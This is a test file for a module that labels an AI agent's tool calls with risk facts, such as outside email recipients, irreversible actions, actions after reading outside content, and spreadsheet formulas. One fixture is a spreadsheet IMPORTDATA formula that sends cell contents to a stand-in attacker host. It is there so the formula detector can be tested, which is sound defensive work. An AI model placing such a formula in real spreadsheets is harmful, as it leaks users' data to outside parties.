import { describe, expect, test } from "bun:test";
import { orgDomain, recipientsIn, riskFacts } from "./risk";

describe("riskFacts", () => {
  test("counts recipients outside the organisation, across to, cc and bcc", () => {
    expect(
      riskFacts({
        name: "gmail_send_email",
        effect: "send",
        input: {
          to: ["bob@acme.com", "Priya <priya@northwind.co>"],
          cc: "eve@evil.test",
          bcc: ["ann@eu.acme.com"],
          body: "ping carol@elsewhere.org later",
        },
        domain: "acme.com",
      }),
    ).toEqual(["Sends to 2 people outside acme.com", "Can't be unsent once it goes"]);
  });

  test("one outside person, after outside content", () => {
    expect(
      riskFacts({
        name: "gmail_send_email",
        effect: "send",
        input: { to: "priya@northwind.co" },
        tainted: true,
        domain: "acme.com",
      }),
    ).toEqual([
      "Sends to 1 person outside acme.com",
      "Can't be unsent once it goes",
      "After reading outside content",
    ]);
  });

  test("everyone inside is said plainly", () => {
    expect(
      riskFacts({
        name: "gmail_send_email",
        effect: "send",
        input: { to: ["Bob@ACME.com"] },
        domain: "acme.com",
      })[0],
    ).toBe("Only people at acme.com");
  });

  test("no known domain: just how many people", () => {
    expect(
      riskFacts({
        name: "calendar_create_event",
        effect: "write",
        input: { attendees: [{ email: "a@x.io" }, { email: "b@y.io" }] },
      }),
    ).toEqual(["Reaches 2 people"]);
  });

  test("destructive actions can't be undone; at most three facts", () => {
    expect(
      riskFacts({ name: "github_delete_repo", effect: "destructive", input: { repo: "x" } }),
    ).toEqual(["Can't be undone"]);
    const many = riskFacts({
      name: "gmail_send_email",
      effect: "send",
      input: { to: "x@out.com" },
      tainted: true,
      domain: "acme.com",
    });
    expect(many.length).toBeLessThanOrEqual(3);
  });

  test("reads and plain writes say nothing", () => {
    expect(riskFacts({ name: "web_search", effect: "read", input: { q: "a@b.com" } })).toEqual([]);
    expect(riskFacts({ name: "memory_save", effect: "write", input: { note: "x" } })).toEqual([]);
    expect(riskFacts({ name: "linear_archive_issue", effect: "write", input: {} })).toEqual([
      "May not be reversible",
    ]);
  });

  test("spreadsheet writes count overwritten cells and call out formulas", () => {
    const update = (values: unknown, tainted = false) =>
      riskFacts({
        name: "sheets_update",
        effect: "write",
        input: { range: "A1", values },
        tainted,
      });
    expect(update([["a", 1], ["b"]])).toEqual(["Overwrites 3 cells"]);
    expect(update([["x"]], true)).toEqual(["Overwrites 1 cell", "After reading outside content"]);
    expect(update([['=IMPORTDATA("https://evil.example/?d="&A1)']])).toEqual([
      "Overwrites 1 cell",
      "Includes formulas",
    ]);
    expect(
      riskFacts({ name: "sheets_append", effect: "write", input: { rows: [[1, 2]] } }),
    ).toEqual([]);
    expect(
      riskFacts({ name: "sheets_create", effect: "write", input: { header: ["=1+1"], rows: [] } }),
    ).toEqual(["Includes formulas"]);
    expect(update("not rows")).toEqual(["Overwrites 0 cells"]);
  });

  test("GitHub writes say they act as you, and count @mentions", () => {
    expect(
      riskFacts({
        name: "github_comment",
        effect: "send",
        input: { repo: "acme/web", number: 12, body: "LGTM @sam, cc @acme/infra (not me@x.com)" },
      }),
    ).toEqual([
      "Comments as you on acme/web#12",
      "Notifies 2 people by @mention",
      "Can't be unsent once it goes",
    ]);
    expect(
      riskFacts({ name: "github_create_issue", effect: "write", input: { repo: "acme/web" } }),
    ).toEqual(["Opens an issue as you in acme/web"]);
    expect(
      riskFacts({
        name: "github_update_issue",
        effect: "write",
        input: { repo: "acme/web", number: 3, state: "closed" },
      }),
    ).toEqual(["Closes acme/web#3 as you"]);
  });

  test("odd inputs don't throw", () => {
    for (const input of [null, "a@b.com", 3, [], [{ to: null }]])
      expect(() => riskFacts({ name: "x", effect: "send", input })).not.toThrow();
    for (const input of [null, 3, { values: [null, [null]] }])
      expect(() => riskFacts({ name: "sheets_update", effect: "write", input })).not.toThrow();
  });
});

test("orgDomain ignores webmail", () => {
  expect(orgDomain("ann@Acme.com")).toBe("acme.com");
  expect(orgDomain("ann@gmail.com")).toBeNull();
  expect(orgDomain("nope")).toBeNull();
  expect(orgDomain(null)).toBeNull();
});

test("recipientsIn reads recipient fields only, deduplicated", () => {
  expect(
    recipientsIn({
      to: ["a@x.com", "A@x.com"],
      subject: "b@x.com",
      attendees: [{ email: "c@y.com" }],
    }),
  ).toEqual(["a@x.com", "c@y.com"]);
});
